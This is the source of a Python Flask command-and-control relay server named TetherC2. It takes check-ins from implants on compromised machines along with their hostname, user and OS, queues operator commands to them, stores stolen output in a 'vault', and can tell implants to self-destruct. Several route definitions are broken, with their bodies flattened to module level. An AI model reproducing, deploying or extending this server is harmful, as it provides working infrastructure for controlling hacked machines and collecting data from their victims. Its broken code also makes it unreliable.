# C2_Server/relay_server.py
import sys, os, sqlite3, json, time, threading, random
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta

# --- Configuration for Inactive Account Cleanup ---
INACTIVITY_PERIOD_DAYS = 180  # 6 months (approx.)
CLEANUP_INTERVAL_SECONDS = 86400  # Run cleanup once per day (24 hours)

class DatabaseManager:
    def __init__(self, db_file="tether_server.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.setup_schema()

    def setup_schema(self):
        """Ensures all necessary tables and columns exist."""
        self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL, assigned_line INTEGER NOT NULL)")
        self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
        self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")
        # --- Add last_login column to users table if it doesn't exist ---
        try:
            self.conn.execute("ALTER TABLE users ADD COLUMN last_login TEXT")
            print("[DB Setup] 'last_login' column added to users table.")
        except sqlite3.OperationalError:
            pass # Column already exists, which is fine.
        self.conn.commit()

    def delete_all_data_for_user(self, username):
        try:
            cursor = self.conn.cursor()
            cursor.execute("SELECT session_id FROM sessions WHERE owner_username = ?", (username,))
            session_ids = [row[0] for row in cursor.fetchall()]
            
            if session_ids:
                placeholders = ','.join('?' for _ in session_ids)
                cursor.execute(f"DELETE FROM vault WHERE session_id IN ({placeholders})", session_ids)
            
            cursor.execute("DELETE FROM sessions WHERE owner_username = ?", (username,))
            self.conn.commit()
            return True
        except sqlite3.Error as e:
            print(f"Database sanitize error for user {username}: {e}")
            return False

    def create_user(self, username, password_hash):
        try:
            assigned_line = random.randint(1, 10)
            # --- Set initial last_login on creation ---
            current_timestamp = datetime.utcnow().isoformat()
            self.conn.execute("INSERT INTO users (username, password_hash, assigned_line, last_login) VALUES (?, ?, ?, ?)", (username, password_hash, assigned_line, current_timestamp))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

    def get_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT username, password_hash, assigned_line FROM users WHERE username = ?", (username,))
        return cursor.fetchone()

    # --- NEW: Method to update the last login timestamp ---
    def update_user_last_login(self, username):
        try:
            current_timestamp = datetime.utcnow().isoformat()
            self.conn.execute("UPDATE users SET last_login = ? WHERE username = ?", (current_timestamp, username))
            self.conn.commit()
        except sqlite3.Error as e:
            print(f"Failed to update last_login for {username}: {e}")

    # --- NEW: Method to find and completely delete inactive users ---
    def find_and_delete_inactive_users(self):
        print(f"[Sanitize Task] Running scheduled task to delete users inactive for over {INACTIVITY_PERIOD_DAYS} days...")
        try:
            cursor = self.conn.cursor()
            cutoff_date = datetime.utcnow() - timedelta(days=INACTIVITY_PERIOD_DAYS)
            
            # Find users whose last login was before the cutoff date.
            cursor.execute("SELECT username FROM users WHERE last_login IS NOT NULL AND last_login < ?", (cutoff_date.isoformat(),))
            inactive_users = [row[0] for row in cursor.fetchall()]

            if not inactive_users:
                print("[Sanitize Task] No inactive users found.")
                return

            print(f"[Sanitize Task] Found {len(inactive_users)} inactive users to delete: {inactive_users}")

            for username in inactive_users:
                print(f"[Sanitize Task] Deleting user '{username}' due to inactivity...")
                self.delete_all_data_for_user(username)  # Clear sessions and vault
                cursor.execute("DELETE FROM users WHERE username = ?", (username,)) # Delete the user account
                print(f"[Sanitize Task] Successfully deleted user '{username}'.")
            
            self.conn.commit()
            print("[Sanitize Task] Cleanup complete.")
        except sqlite3.Error as e:
            print(f"An error occurred during the inactive user cleanup task: {e}")

    def create_or_update_session(self, session_id, owner_username, metadata):
        self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata))); self.conn.commit()
    def get_sessions_for_user(self, username):
        cursor = self.conn.cursor(); cursor.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,)); return {row[0]: json.loads(row[1]) for row in cursor.fetchall()}
    def save_vault_data(self, session_id, module_name, data):
        self.conn.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, module_name, json.dumps(data))); self.conn.commit()
    def load_vault_data_for_user(self, username):
        user_sessions = self.get_sessions_for_user(username); vault_data = {}
        for session_id, metadata in user_sessions.items(): vault_data[session_id] = {"metadata": metadata}
        if not user_sessions: return {}
        placeholders = ','.join('?' for _ in user_sessions); query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({placeholders})"
        for sid, mod_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if sid in vault_data: vault_data[sid][mod_name] = json.loads(data_json)
        return vault_data

SESSION_TIMEOUT_SECONDS = 40; app = Flask(__name__); db = DatabaseManager(); command_queue, response_queue, active_sessions = {}, {}, {}; cmd_lock, res_lock, ses_lock = threading.Lock(), threading.Lock(), threading.Lock()

@app.route('/auth/register', methods=['POST'])
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not all([username, password]) or len(password) < 4:
        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    if db.create_user(username, generate_password_hash(password)):
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        # --- UPDATE LAST LOGIN ON SUCCESS ---
        db.update_user_last_login(username)
        return jsonify({"success": True, "username": user[0], "assigned_line": user[2]})
    else:
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json; sid, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([sid, c2_user]): return jsonify({"error": "session_id and c2_user are required"}), 400
    with ses_lock: metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}; db.create_or_update_session(sid, c2_user, metadata); active_sessions[sid] = {"owner": c2_user, "last_seen": time.time(), **metadata}
    if "results" in data:
        for result in data.get("results", []):
            mod_name, out_data = result.get("command"), result.get("output")
            if mod_name and out_data is not None: db.save_vault_data(sid, mod_name, out_data);
            with res_lock: response_queue.setdefault(c2_user, {}).setdefault(sid, []).append(result)
    with cmd_lock: commands = command_queue.get(c2_user, {}).pop(sid, []); return jsonify({"commands": commands})
@app.route('/implant/response', methods=['POST'])
def handle_implant_response(): data = request.json; sid = data.get("session_id"); owner = active_sessions.get(sid, {}).get("owner")
if owner: mod_name, out_data = data.get("command"), data.get("output");
if mod_name and out_data is not None: db.save_vault_data(sid, mod_name, out_data)
with res_lock: response_queue.setdefault(owner, {}).setdefault(sid, []).append(data)
return jsonify({"status": "ok"})

@app.route('/c2/sanitize', methods=['POST'])
def handle_c2_sanitize():
    username = request.json.get("username")
    if not username:
        return jsonify({"success": False, "error": "Username is required"}), 400
    with ses_lock:
        online_sids = [sid for sid, data in active_sessions.items() if data.get("owner") == username and (time.time() - data.get("last_seen", 0)) < SESSION_TIMEOUT_SECONDS]
    with cmd_lock:
        for sid in online_sids:
            command_queue.setdefault(username, {}).setdefault(sid, []).append({"action": "self_destruct", "params": {}})
    if db.delete_all_data_for_user(username):
        return jsonify({"success": True, "message": f"All data for user '{username}' has been sanitized."})
    else:
        return jsonify({"success": False, "error": "A database error occurred during sanitation."}), 500

@app.route('/c2/task', methods=['POST'])
def handle_c2_task(): data = request.json; username, sid, command = data.get("username"), data.get("session_id"), data.get("command");
if not all([username, sid, command]): return jsonify({"status": "error", "message": "Missing params"}), 400
with cmd_lock: command_queue.setdefault(username, {}).setdefault(sid, []).append(command); return jsonify({"status": "ok"})
@app.route('/c2/discover', methods=['POST'])
def discover_sessions(): username = request.json.get("username"); user_sessions = {};
with ses_lock:
    for sid, data in active_sessions.items():
        if data.get("owner") == username and (time.time() - data.get("last_seen", 0)) < SESSION_TIMEOUT_SECONDS: user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"], "os": data.get("os", "Unknown")}
return jsonify({"sessions": user_sessions})
@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses(): username, sid = request.json.get("username"), request.json.get("session_id");
with res_lock: responses = response_queue.get(username, {}).pop(sid, []); return jsonify({"responses": responses})
@app.route('/c2/get_all_vault_data', methods=['POST'])
def get_all_vault_data(): username = request.json.get("username");
if not username: return jsonify({"success": False, "error": "Username is required"}), 400
vault_data = db.load_vault_data_for_user(username); return jsonify({"success": True, "data": vault_data})

@app.route('/')
def index(): return "TetherC2 Relay is operational."

# --- NEW: Scheduler for the cleanup task ---
def start_cleanup_scheduler():
    """Starts a recurring timer to run the delete_inactive_users function."""
    db.find_and_delete_inactive_users()
    # Schedule the next run
    threading.Timer(CLEANUP_INTERVAL_SECONDS, start_cleanup_scheduler).start()

if __name__ == '__main__':
    # --- Start the cleanup scheduler when the server starts ---
    start_cleanup_scheduler()
    port = int(os.environ.get('PORT', 5001))
    print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
    app.run(host='0.0.0.0', port=port)